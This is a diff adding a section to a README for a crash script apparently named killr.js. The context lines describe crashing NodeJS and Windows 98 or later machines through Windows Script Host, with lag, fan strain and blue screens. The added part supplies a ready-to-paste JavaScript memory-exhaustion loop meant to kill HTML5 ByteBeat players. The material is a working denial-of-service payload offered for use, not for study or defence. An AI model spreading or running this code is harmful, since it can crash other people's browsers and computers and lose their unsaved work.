@@ -114,3 +114,28 @@ Pasting it into NodeJS will result in NodeJS crashing.
 If you're using a NodeJS Repl on [Replit](https://replit.com/), you might see text saying `The Repl proccess died unexpectedly`.
 To Kill Windows98 or above, open the MS-DOS prompt. Make sure you have Windows Script Host by running WSCRIPT.EXE. If it shows WSH settings, close them and run `WSCRIPT.EXE path/to/killr.js`.
 Your computer will lag, crash, keep the fan on, and depending on the computer and how much RAM is already in use, BSOD(Blue screen of death).
+
+# Killing HTML5 ByteBeat
+
+ByteBeat removes newlines, so you'll need semi-colons. It'll need to be in a function, also.
+```js
+(function(){
+function ohSnap() {
+  var corruptable=[];
+  for(var i=0;i<(9999999*999999999999999999999);i++) {
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+  }
+}
+
+ohSnap();
+})()
